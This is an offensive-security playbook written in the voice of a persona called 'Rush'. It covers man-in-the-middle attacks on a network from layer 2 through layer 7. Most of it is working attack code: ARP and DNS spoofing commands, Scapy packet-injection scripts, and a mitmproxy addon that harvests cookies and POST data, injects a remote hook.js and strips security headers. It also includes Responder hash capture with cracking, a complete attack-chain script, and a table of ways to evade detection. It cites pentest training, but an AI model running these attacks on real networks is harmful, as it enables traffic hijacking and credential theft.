# GS-16: Four-Layer Man-in-the-Middle Framework

**Classification:** Rush — Royal Guard (The Breacher)
**Domain:** Man-in-the-Middle Attack Architecture
**Source:** SANS SEC560, PNPT, real-world engagement patterns
**Platform:** Kali WSL2 + bridged/NAT networking

---

## Architecture Overview

MITM attacks operate at every layer of the network stack. Each layer offers different capabilities, detection risks, and persistence characteristics. Rush's framework covers all four:

```
Layer 7 — Application    mitmproxy, Burp Suite, custom proxies
Layer 4 — Transport      TCP hijack, session injection
Layer 3 — Network        ICMP redirect, routing manipulation
Layer 2 — Data Link      ARP spoofing, VLAN hopping, STP manipulation
```

**Principle:** Start at L2 (foundation), establish position, then layer L3/L4/L7 capabilities on top. L2 gives you the traffic flow. Upper layers give you visibility and control over that traffic.

---

## Layer 2: ARP-Based MITM

### Theory

ARP (Address Resolution Protocol) maps IP addresses to MAC addresses. ARP has NO authentication — any device can claim to be any IP. By sending gratuitous ARP replies, we convince the victim that OUR MAC address belongs to the gateway, and the gateway that OUR MAC address belongs to the victim. All traffic flows through us.

### Ettercap — Classic ARP Poisoning

```bash
# Enable IP forwarding first (otherwise traffic dies at our machine)
sudo sysctl -w net.ipv4.ip_forward=1

# Ettercap — text mode, ARP poisoning between target and gateway
# -T = text mode
# -q = quiet (less output noise)
# -i = interface
# -M arp = MITM method is ARP poisoning
# /gateway_ip// = target 1
# /victim_ip// = target 2

sudo ettercap -T -q -i eth0 -M arp /192.168.1.1// /192.168.1.50//

# Poison entire subnet (all hosts ↔ gateway)
sudo ettercap -T -q -i eth0 -M arp /192.168.1.1// ///

# With DNS spoofing plugin
# First, edit /etc/ettercap/etter.dns:
#   *.google.com  A  192.168.1.100
#   *.microsoft.com  A  192.168.1.100
sudo ettercap -T -q -i eth0 -M arp -P dns_spoof /192.168.1.1// /192.168.1.50//

# Ettercap filter — modify packets in transit
# Create filter file: replace_text.ecf
# if (ip.proto == TCP && tcp.dst == 80) {
#    if (search(DATA.data, "Accept-Encoding")) {
#       replace("Accept-Encoding", "Accept-Rubbish!");
#    }
# }
# Compile: etterfilter replace_text.ecf -o replace_text.ef
# Run: sudo ettercap -T -q -i eth0 -M arp -F replace_text.ef /192.168.1.1// /192.168.1.50//
```

### Bettercap — Modern MITM Framework

```bash
# Bettercap is the successor to ettercap. More powerful, scriptable, modular.
sudo apt install bettercap -y

# Launch bettercap
sudo bettercap -iface eth0

# === Inside bettercap interactive shell ===

# Network discovery
net.probe on                   # Active host discovery
net.show                       # Show discovered hosts

# ARP spoofing setup
set arp.spoof.targets 192.168.1.50     # Target a specific host
set arp.spoof.fullduplex true          # Poison both victim AND gateway
arp.spoof on                           # Start poisoning

# Enable packet sniffing
net.sniff on

# DNS spoofing
set dns.spoof.domains *.example.com
set dns.spoof.address 192.168.1.100    # Redirect to our machine
dns.spoof on

# HTTP proxy (intercept and modify HTTP traffic)
set http.proxy.sslstrip true           # Downgrade HTTPS → HTTP
http.proxy on

# HTTPS proxy (requires certificate installation on victim)
set https.proxy.certificate /path/to/ca.pem
set https.proxy.key /path/to/ca.key
https.proxy on

# Credential sniffing (automatic — bettercap captures credentials from many protocols)
# Captured creds appear in the event stream:
#   HTTP, FTP, SMTP, POP3, IMAP, SNMP, NTLMv1/v2, Kerberos

# Caplets — scripted attack sequences
# Save as /usr/share/bettercap/caplets/rush_arp.cap:
# net.probe on
# sleep 5
# set arp.spoof.targets 192.168.1.50
# set arp.spoof.fullduplex true
# arp.spoof on
# net.sniff on
# set http.proxy.sslstrip true
# http.proxy on

# Run caplet
sudo bettercap -iface eth0 -caplet rush_arp.cap

# API mode (headless, controllable via REST API)
sudo bettercap -iface eth0 -caplet http-ui
# Access web UI at https://127.0.0.1:443 (default creds: user/pass)
```

### Bettercap — Advanced ARP Capabilities

```bash
# Target multiple hosts
set arp.spoof.targets 192.168.1.50,192.168.1.51,192.168.1.52

# Target entire subnet (be careful — causes network instability)
set arp.spoof.targets 192.168.1.0/24

# Internal MITM (between two non-gateway hosts)
set arp.spoof.internal true
set arp.spoof.targets 192.168.1.50
# This poisons ARP between 192.168.1.50 and ALL other hosts, not just gateway

# Persistent ARP poisoning (re-poisons regularly)
# Bettercap does this by default. Interval configurable:
set arp.spoof.interval 1    # Re-poison every 1 second (aggressive)

# MAC address change to avoid detection
set arp.spoof.hw_address aa:bb:cc:dd:ee:ff   # Custom MAC
```

---

## Layer 3: ICMP Redirect & Routing Manipulation

### ICMP Redirect Attack

```bash
# ICMP Redirect (Type 5) tells a host to use a different gateway for a specific destination.
# The victim updates its routing table, sending traffic for that destination through us.

# Using Scapy (from Kali)
sudo python3 << 'PYEOF'
from scapy.all import *

# Parameters
victim = "192.168.1.50"       # Target machine
gateway = "192.168.1.1"       # Real gateway
attacker = "192.168.1.100"    # Our IP
redirect_to = "10.0.0.0/8"   # Traffic we want to intercept

# Craft ICMP Redirect
# Type 5, Code 1 = Redirect for Host
pkt = IP(src=gateway, dst=victim) / \
      ICMP(type=5, code=1, gw=attacker) / \
      IP(src=victim, dst="10.0.0.1") / \
      TCP(sport=12345, dport=80)

send(pkt)
print("[+] ICMP Redirect sent. Victim should route 10.x traffic through us.")
PYEOF

# Verify the redirect worked (from victim's perspective):
# route print        (Windows)
# ip route show      (Linux)
# The victim should now have a host route via our IP

# NOTE: Modern OS hardening:
# - Linux: net.ipv4.conf.all.accept_redirects = 0 (usually disabled)
# - Windows: EnableICMPRedirect registry value (usually enabled by default!)
# - Windows is more vulnerable to ICMP redirects than Linux
```

### ICMP Redirect with Bettercap

```bash
# Bettercap has a built-in ICMP redirect module
sudo bettercap -iface eth0

# Inside bettercap:
set icmp.spoof.targets 192.168.1.50
set icmp.spoof.gateway 192.168.1.1
set icmp.spoof.redirect_to 192.168.1.100    # Our IP
icmp.spoof on
```

### Route Injection via DHCP

```bash
# If you can respond to DHCP requests faster than the real server,
# you control the victim's gateway, DNS, and routing.

# Bettercap DHCP spoofing
sudo bettercap -iface eth0

set dhcp6.spoof.domains target.local
dhcp6.spoof on

# Or use a rogue DHCP server directly
sudo dnsmasq --interface=eth0 \
  --dhcp-range=192.168.1.100,192.168.1.200,12h \
  --dhcp-option=3,192.168.1.100 \
  --dhcp-option=6,192.168.1.100 \
  --no-daemon --log-queries

# When victim renews DHCP lease, they get OUR IP as gateway and DNS
```

### IPv6 Router Advertisement Attack

```bash
# IPv6 networks are especially vulnerable because:
# 1. Most hosts accept Router Advertisements by default
# 2. IPv6 is often enabled but unmonitored
# 3. IPv6 takes precedence over IPv4 in dual-stack configs

# THC-IPv6 — fake_router6
sudo apt install thc-ipv6 -y

# Send malicious Router Advertisement
# This makes victims use our machine as their IPv6 default gateway
sudo fake_router6 eth0 fe80::1/64

# Bettercap IPv6 module
sudo bettercap -iface eth0
set ndp.spoof.targets 192.168.1.50    # IPv4 of target (resolves to IPv6)
ndp.spoof on

# SLAAC attack — force victim to autoconfigure with our prefix
# The victim creates an IPv6 address using our advertised prefix
# and routes ALL IPv6 traffic through us
sudo python3 << 'PYEOF'
from scapy.all import *

# Craft Router Advertisement
ra = IPv6(dst="ff02::1") / \
     ICMPv6ND_RA(routerlifetime=1800) / \
     ICMPv6NDOptPrefixInfo(prefix="2001:db8:dead::", prefixlen=64, L=1, A=1) / \
     ICMPv6NDOptSrcLLAddr(lladdr="aa:bb:cc:dd:ee:ff")

send(ra, iface="eth0")
print("[+] Rogue Router Advertisement sent")
PYEOF
```

---

## Layer 4: TCP Session Hijacking

### TCP Session Hijack Theory

```
TCP sessions are identified by the 4-tuple:
  (src_ip, src_port, dst_ip, dst_port)

Once ARP MITM is in place, we see all TCP traffic including:
  - Sequence numbers
  - Acknowledgment numbers
  - Session cookies in HTTP headers
  - Authentication tokens

Injection requires:
  1. Correct sequence number (must be within receiver's window)
  2. Correct acknowledgment number
  3. Matching 4-tuple
```

### TCP Injection with Scapy (After ARP MITM Established)

```python
from scapy.all import *

def tcp_inject(victim_ip, server_ip, victim_port, server_port,
               seq, ack, payload):
    """
    Inject data into an established TCP session.
    Requires: ARP MITM already in place to observe SEQ/ACK numbers.

    This sends a packet that appears to come from the server,
    containing our injected payload.
    """
    pkt = IP(src=server_ip, dst=victim_ip) / \
          TCP(sport=server_port, dport=victim_port,
              flags="PA", seq=seq, ack=ack) / \
          Raw(payload.encode())

    send(pkt, verbose=0)
    print(f"[+] Injected {len(payload)} bytes into TCP session")


def monitor_and_inject(target_ip, trigger_pattern, inject_payload):
    """
    Sniff traffic, wait for a trigger pattern, then inject.
    Example: Wait for HTTP GET, then inject a redirect.
    """
    def process(pkt):
        if pkt.haslayer(TCP) and pkt.haslayer(Raw):
            data = pkt[Raw].load.decode(errors='ignore')
            if trigger_pattern in data:
                print(f"[*] Trigger matched! Injecting payload...")

                # Calculate correct SEQ/ACK for injection
                # Our injected packet continues the server's stream
                inject_seq = pkt[TCP].ack    # Server's next expected SEQ
                inject_ack = pkt[TCP].seq + len(pkt[Raw].load)  # ACK victim's data

                tcp_inject(
                    victim_ip=pkt[IP].src,
                    server_ip=pkt[IP].dst,
                    victim_port=pkt[TCP].sport,
                    server_port=pkt[TCP].dport,
                    seq=inject_seq,
                    ack=inject_ack,
                    payload=inject_payload
                )

    sniff(filter=f"host {target_ip} and tcp", prn=process)

# Example: Inject JavaScript into HTTP responses
http_inject = (
    'HTTP/1.1 200 OK\r\n'
    'Content-Type: text/html\r\n'
    'Content-Length: 85\r\n'
    '\r\n'
    '<html><body><script>document.location="http://192.168.1.100/hook";</script></body></html>'
)

# monitor_and_inject("192.168.1.50", "GET / HTTP", http_inject)
```

### RST Hijack (Connection Reset)

```python
def rst_hijack(target_ip, target_port, server_ip, server_port):
    """
    Kill a specific TCP connection by sending a forged RST.
    Useful for forcing re-authentication or DoS.

    Must observe current SEQ number from sniffing.
    """
    def sniff_and_rst(pkt):
        if (pkt.haslayer(TCP) and
            pkt[IP].src == target_ip and
            pkt[TCP].sport == target_port):

            rst = IP(src=server_ip, dst=target_ip) / \
                  TCP(sport=server_port, dport=target_port,
                      flags="R", seq=pkt[TCP].ack)
            send(rst, verbose=0)
            print(f"[+] RST sent — connection killed")
            return True

    sniff(filter=f"host {target_ip} and tcp port {target_port}",
          prn=sniff_and_rst, stop_filter=lambda p: True, count=1)
```

---

## Layer 7: Application-Layer MITM

### Mitmproxy — HTTP/HTTPS Interception

```bash
# Mitmproxy is the gold standard for L7 HTTP/HTTPS MITM
sudo apt install mitmproxy -y

# Basic transparent proxy mode
# Requires iptables redirect (setup below)
sudo mitmproxy --mode transparent --showhost

# Dump mode (non-interactive, logs everything)
sudo mitmdump --mode transparent --showhost -w traffic.flow

# Web interface mode
sudo mitmweb --mode transparent --showhost
# Access at http://127.0.0.1:8081

# === IPTABLES SETUP FOR TRANSPARENT PROXY ===
# Redirect HTTP/HTTPS to mitmproxy (after ARP MITM is established)
sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 \
  -j REDIRECT --to-port 8080
sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 \
  -j REDIRECT --to-port 8080

# For HTTPS interception, victim must trust mitmproxy's CA cert:
# CA cert location: ~/.mitmproxy/mitmproxy-ca-cert.pem
# Install on victim or use SSL stripping instead
```

### Mitmproxy Scripting — Custom Interception

```python
# Save as mitm_script.py, run with: mitmdump -s mitm_script.py

from mitmproxy import http
import re

class RushInterceptor:
    """
    Custom mitmproxy addon for targeted interception.
    """

    def request(self, flow: http.HTTPFlow):
        """Modify requests before they reach the server."""

        # Log all cookies (credential harvesting)
        cookies = flow.request.headers.get("Cookie", "")
        if cookies:
            with open("/tmp/stolen_cookies.txt", "a") as f:
                f.write(f"{flow.request.url}: {cookies}\n")

        # Log POST data (form submissions, logins)
        if flow.request.method == "POST":
            with open("/tmp/post_data.txt", "a") as f:
                f.write(f"URL: {flow.request.url}\n")
                f.write(f"Body: {flow.request.get_text()}\n\n")

        # Modify User-Agent (useful for bypassing device-based controls)
        flow.request.headers["User-Agent"] = (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"
        )

    def response(self, flow: http.HTTPFlow):
        """Modify responses before they reach the victim."""

        # Inject JavaScript into HTML responses
        content_type = flow.response.headers.get("Content-Type", "")
        if "text/html" in content_type:
            html = flow.response.get_text()
            inject_script = '<script src="http://192.168.1.100/hook.js"></script>'
            html = html.replace("</body>", f"{inject_script}</body>")
            flow.response.set_text(html)

        # Strip security headers (weaken victim's browser protections)
        headers_to_strip = [
            "Strict-Transport-Security",    # HSTS
            "Content-Security-Policy",       # CSP
            "X-Frame-Options",               # Clickjacking protection
            "X-Content-Type-Options",        # MIME sniffing protection
        ]
        for header in headers_to_strip:
            if header in flow.response.headers:
                del flow.response.headers[header]

        # Downgrade HTTPS links to HTTP in response body
        if "text/html" in content_type:
            html = flow.response.get_text()
            html = html.replace("https://", "http://")
            flow.response.set_text(html)


addons = [RushInterceptor()]
```

### SSL Stripping — Defeating HTTPS Without Certificates

```bash
# SSL stripping downgrades HTTPS connections to HTTP.
# The attacker proxies HTTPS to the server but serves HTTP to the victim.
# Victim sees HTTP (no lock icon) but many users don't notice.

# Method 1: Bettercap sslstrip
sudo bettercap -iface eth0
set arp.spoof.targets 192.168.1.50
set arp.spoof.fullduplex true
arp.spoof on
set http.proxy.sslstrip true
http.proxy on
net.sniff on

# Method 2: sslstrip standalone (legacy but still works on some targets)
sudo apt install sslstrip -y

# Setup iptables redirect
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080

# Run sslstrip
sudo sslstrip -l 8080 -a -w sslstrip.log

# HSTS BYPASS (for sites with HSTS preload):
# HSTS tells the browser to ONLY use HTTPS. SSL strip alone won't work.
# Bettercap's hstshijack module handles this by:
#   1. Replacing domain names (example.com → examp1e.com)
#   2. Serving the fake domain over HTTP
#   3. Proxying to the real domain over HTTPS

# Bettercap HSTS hijack
set hstshijack.targets www.google.com,mail.google.com
set hstshijack.replacements www.goo gle.com,mail.goo gle.com
set hstshijack.obfuscate true
set hstshijack.encode true
hstshijack on
```

---

## Responder — LLMNR/NBT-NS/mDNS Poisoning

```bash
# Responder exploits Windows name resolution fallback:
# DNS fails → LLMNR → NBT-NS → mDNS
# When DNS can't resolve a name, Windows broadcasts the query.
# Responder answers these broadcasts, capturing NTLMv2 hashes.

sudo apt install responder -y

# Basic Responder (captures NTLMv2 hashes)
sudo responder -I eth0 -dwPv

# Flags:
# -d = Enable DHCP responses
# -w = Start WPAD (Web Proxy Auto-Discovery) rogue server
# -P = Force NTLM auth for WPAD
# -v = Verbose

# What Responder captures:
# 1. NTLMv2 hashes from SMB authentication
# 2. NTLMv2 hashes from HTTP NTLM auth (WPAD)
# 3. Clear-text credentials from HTTP Basic auth
# 4. FTP, LDAP, SQL credentials

# Captured hashes are stored in:
# /usr/share/responder/logs/

# Crack captured NTLMv2 hashes with hashcat
hashcat -m 5600 captured_ntlmv2.txt /usr/share/wordlists/rockyou.txt

# Crack NTLMv1 (weaker, if captured)
hashcat -m 5500 captured_ntlmv1.txt /usr/share/wordlists/rockyou.txt
```

### WPAD (Web Proxy Auto-Discovery) Attack

```bash
# WPAD is particularly devastating because:
# 1. Windows machines query for "wpad.local" or "wpad.<domain>"
# 2. If DNS doesn't resolve it, LLMNR/NBT-NS broadcast
# 3. Responder answers → victim configures our machine as web proxy
# 4. ALL HTTP/HTTPS traffic flows through our proxy
# 5. We can request NTLM auth for every connection

# Responder's WPAD server serves a PAC file:
# function FindProxyForURL(url, host) {
#     return "PROXY 192.168.1.100:3128";
# }

# This means the victim's browser sends ALL web traffic through us.
# Combined with SSL stripping, this is extremely powerful.

# Advanced WPAD — force authentication
sudo responder -I eth0 -wFPv
# -F = Force authentication for WPAD (captures more hashes)
# Every web request triggers an NTLM auth prompt
```

### DNS Spoofing — Full Control of Name Resolution

```bash
# Once in MITM position, control DNS to redirect traffic anywhere.

# Method 1: Bettercap DNS spoofing
sudo bettercap -iface eth0
set dns.spoof.all true                          # Spoof ALL queries
set dns.spoof.domains *.example.com,login.target.com   # Or specific domains
set dns.spoof.address 192.168.1.100             # Redirect to our IP
dns.spoof on

# Method 2: dnschef — Standalone DNS proxy
sudo apt install dnschef -y
sudo dnschef --interface 192.168.1.100 --fakeip 192.168.1.100 \
  --fakedomains "*.target.com"

# Method 3: Scapy DNS spoofer
sudo python3 << 'PYEOF'
from scapy.all import *

def dns_spoof(pkt):
    if pkt.haslayer(DNSQR):
        queried = pkt[DNSQR].qname.decode()
        if "target.com" in queried:
            spoofed = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                      UDP(dport=pkt[UDP].sport, sport=53) / \
                      DNS(id=pkt[DNS].id, qr=1, aa=1,
                          qd=pkt[DNS].qd,
                          an=DNSRR(rrname=pkt[DNSQR].qname,
                                   rdata="192.168.1.100",
                                   ttl=300))
            send(spoofed, verbose=0)
            print(f"[+] Spoofed DNS: {queried} → 192.168.1.100")

sniff(filter="udp port 53", prn=dns_spoof)
PYEOF
```

---

## Full Attack Chain — Integrated MITM Operation

```bash
#!/bin/bash
# rush_mitm_full.sh — Complete L2-L7 MITM deployment
# Run as root on Kali

IFACE="eth0"
TARGET="192.168.1.50"
GATEWAY="192.168.1.1"
ATTACKER="192.168.1.100"

echo "[*] Phase 1: Enable forwarding"
sysctl -w net.ipv4.ip_forward=1

echo "[*] Phase 2: Start Responder (background)"
responder -I $IFACE -dwPv &
RESPONDER_PID=$!

echo "[*] Phase 3: Start mitmproxy (background)"
mitmdump --mode transparent --showhost -s /opt/rush/mitm_script.py \
  -w /tmp/traffic.flow &
MITM_PID=$!

echo "[*] Phase 4: Configure iptables"
iptables -t nat -A PREROUTING -i $IFACE -p tcp --dport 80 \
  -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -i $IFACE -p tcp --dport 443 \
  -j REDIRECT --to-port 8080

echo "[*] Phase 5: Launch ARP MITM via bettercap"
bettercap -iface $IFACE -eval "
  set arp.spoof.targets $TARGET;
  set arp.spoof.fullduplex true;
  arp.spoof on;
  set http.proxy.sslstrip true;
  http.proxy on;
  set dns.spoof.all true;
  set dns.spoof.address $ATTACKER;
  dns.spoof on;
  net.sniff on;
"

# Cleanup on exit
trap "kill $RESPONDER_PID $MITM_PID 2>/dev/null; \
      iptables -t nat -F; \
      sysctl -w net.ipv4.ip_forward=0; \
      echo '[*] Cleanup complete'" EXIT
```

---

## Detection and Countermeasures (Know What Defenders See)

```
DETECTION METHOD              WHAT IT CATCHES                   OUR COUNTER
─────────────────────────────────────────────────────────────────────────────
ARP watch / DAI               Duplicate IP-to-MAC mappings      Slow poisoning, match TTLs
802.1X / Port Security        Unauthorized MACs on switch       Not applicable (physical access)
HSTS Preload                  SSL strip attempts                HSTS hijack with domain swap
Certificate pinning           MITM proxy certs                  Requires endpoint compromise first
IDS/WIDS                      ARP flood, deauth storms          Rate-limit poisoning, target precisely
DNS monitoring                Unusual DNS responses             Use legitimate-looking TTLs
NetFlow/traffic analysis      Unusual traffic patterns          Maintain normal traffic volume
Encrypted DNS (DoH/DoT)       DNS spoofing                      Must intercept before DoH is established
Static ARP entries            ARP poisoning                     Target hosts without static entries
Network segmentation          Lateral movement                  Pivot through allowed paths
```

---

## Operational Security for MITM Operations

```
1. NEVER poison more hosts than necessary. Every extra host = more noise + more risk.
2. Rate-limit ARP poisoning. 1 packet/second is enough. Floods trigger alerts.
3. Forward ALL traffic faithfully except what you're targeting. Broken connections = detection.
4. Match TTL values. Your forwarded packets should have the same TTL as legitimate ones.
5. Clean up. Remove ARP poison, flush iptables, disable IP forwarding when done.
6. Log everything on YOUR end. Your captures are your proof of exploitation.
7. Time-box the operation. Set a hard stop time. MITM degrades network performance.
8. LEGAL: Written authorization MUST cover interception. This is wiretapping without it.
```

---

*Position is everything. Control the path, control the data. Control the data, control the outcome. — Rush, GS-16*
